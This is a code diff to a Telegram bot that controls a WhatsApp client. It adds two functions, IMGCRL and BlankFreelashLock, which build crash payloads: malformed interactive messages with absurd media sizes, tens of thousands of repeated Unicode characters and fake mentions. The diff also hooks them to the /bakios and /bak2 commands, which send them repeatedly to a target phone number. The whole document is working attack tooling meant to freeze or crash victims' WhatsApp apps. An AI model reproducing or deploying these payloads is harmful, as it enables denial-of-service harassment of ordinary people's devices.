@@ -1043,6 +1043,76 @@ async function VampireNewUi(target, Ptcp = true) {
         console.log(err);
       }
     }
+    async function IMGCRL(target) {
+let cards = [];
+
+for (let r = 0; r < 5; r++) {
+cards.push({
+body: { text: '📜 • 𝐑𝐀𝐋𝐃𝐙𝐙 𝐌𝐄𝐒𝐒𝐀𝐆𝐄' },
+header: {
+title: ' ',
+imageMessage: {
+url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
+mimetype: "image/jpeg",
+fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
+fileLength: "107374182400",
+height: 9999,
+width: 9999,
+mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
+fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
+directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
+mediaKeyTimestamp: "1749728782"
+},
+hasMediaAttachment: true
+},
+nativeFlowMessage: {
+messageParamsJson: '%'.repeat(99999),
+buttons: [
+{
+name: "cta_call",
+buttonParamsJson: JSON.stringify({ status: 9999 })
+},
+{
+name: "single_select",
+buttonParamsJson: JSON.stringify({ status: 9999 })
+}
+]
+}
+});
+}
+
+let msg = await generateWAMessageFromContent(target, {
+viewOnceMessage: {
+message: {
+messageContextInfo: {
+deviceListMetadata: {},
+deviceListMetadataVersion: 2
+},
+interactiveMessage: {
+body: { text: 'ꦾ'.repeat(60000) },
+footer: { text: '© !𝗌`𝗋𝖺𝗅𝖽𝗓𝗓 𝗑𝗒𝗓 ' },
+carouselMessage: {
+cards: cards
+},
+contextInfo: {
+participant: "0@s.whatsapp.net",
+remoteJid: "@s.whatsapp.net",
+mentionedJid: [
+target,
+...Array.from({ length: 35000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
+],
+}
+}
+}
+}
+}, {});
+
+await sock.relayMessage(target, msg.message, {
+participant: { jid: target },
+messageId: msg.key.id
+});
+}
+
 async function bulldog(target, mention = true) { // Default true biar otomatis nyala
   let message = {
     viewOnceMessage: {
@@ -1818,6 +1888,42 @@ async function delayMakerInvis(target) {
     { participant: { jid: target } },
   );
 }
+async function BlankFreelashLock(target) {
+  const payload = {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          mentionedJid: Array.from({ length: 4500 }, (_, i) => `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`)
+        },
+        interactiveMessage: {
+          header: {
+            hasMediaAttachment: true,
+            title: "‎👹".repeat(9999)
+          },
+          body: {
+            text: "꧀".repeat(9999)
+          },
+          footer: {
+            text: "t.me/sonicwarior"
+          },
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "quick_reply",
+                buttonParamsJson: JSON.stringify({
+                  display_text: "‎",
+                  id: "BlankSonic" + Date.now()
+                })
+              }
+            ]
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, payload, { messageId: "Kok_Hp_Gw_Blank_" + Date.now() });
+}
 async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
     const delaymention = Array.from({ length: 30000 }, (_, r) => ({
         title: "᭡꧈".repeat(95000),
@@ -2556,8 +2662,8 @@ bot.onText(/\/bakios(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
-        await VampiPhone(formatedNumber);
+    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
+        await BlankFreelashLock(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
@@ -2571,7 +2677,7 @@ bot.onText(/\/bakios(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/delaymenhhshdbbdtion(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/bak2(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -2601,8 +2707,8 @@ bot.onText(/\/delaymenhhshdbbdtion(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 500; i++) { // Kirim 3 kali langsung
-        await protocolbug2(formatedNumber);
+    for (let i = 0; i < 3; i++) { // Kirim 3 kali langsung
+        await IMGCRL(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
